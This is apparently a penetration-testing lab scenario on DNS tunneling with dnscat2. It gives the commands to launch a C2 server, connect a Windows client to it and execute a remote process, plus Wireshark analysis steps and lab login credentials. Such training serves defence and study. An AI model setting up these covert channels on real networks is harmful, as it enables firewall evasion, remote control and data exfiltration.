### Scenario

**Covert DNS Tunneling & Command-and-Control (C2)** enables attackers and penetration testers to establish encrypted reverse shell sessions and exfiltrate data by encapsulating payloads inside standard **DNS queries** (`TXT`, `MX`, `A`, `AAAA`) routed to an attacker-controlled authoritative name server.

Key technical concepts in DNSCAT2 covert channels:
1. **Firewall Evasion**: Standard egress filtering often blocks outbound TCP ports (e.g., `4444`, `8080`, `22`), but permits recursive DNS queries (`UDP/53`). DNSCAT2 leverages this trusted protocol to bypass stateful firewalls.
2. **DNSCAT2 Server Architecture**: Launching <font color="#ffd700"><b>sudo dnscat2-server --dns domain=abc.com</b></font> on the attacker machine (<font color="#38bdf8"><b>192.168.0.18</b></font>) initializes a local DNS listener ready to decode C2 queries.
3. **DNSCAT2 Client Payload Execution**: Running <font color="#ffd700"><b>dnscat2-v0.7-client-win32.exe --dns domain=abc.com,server=192.168.0.18</b></font> on Windows 11 client (<font color="#38bdf8"><b>192.168.0.100</b></font>) establishes an encrypted tunnel session over DNS requests.
4. **Remote Execution via Tunnel**: Interacting with session windows (`window -i 1`) and executing process creation commands (<font color="#ffd700"><b>exec notepad.exe</b></font>) spawns target applications over DNS packets.

In this exercise, we log into **Parrot Security** (<font color="#c084fc"><b>pentester</b></font> / <font color="#ff4d4d"><b>toor</b></font>) and **Windows 11** (<font color="#c084fc"><b>cpent</b></font> / <font color="#ff4d4d"><b>Pa$$w0rd</b></font>), perform Nmap reconnaissance, install `dnscat2-server`, extract `dnscat2-client` (password: <font color="#ff4d4d"><b>password</b></font>), start Wireshark packet capture on `Ethernet 2`, launch DNSCAT2 C2 server on domain <font color="#c084fc"><b>abc.com</b></font>, establish client tunnel session from Windows 11, execute remote command <font color="#ffd700"><b>exec notepad.exe</b></font>, capture and analyze DNS packets in Wireshark, and record the remote execution string.

- Spawn remote process on client host over DNS tunnel: <font color="#ffd700"><b>exec notepad.exe</b></font>
- Filter Wireshark DNS packets (`dns`) to analyze encoded C2 queries (`abc.com`)
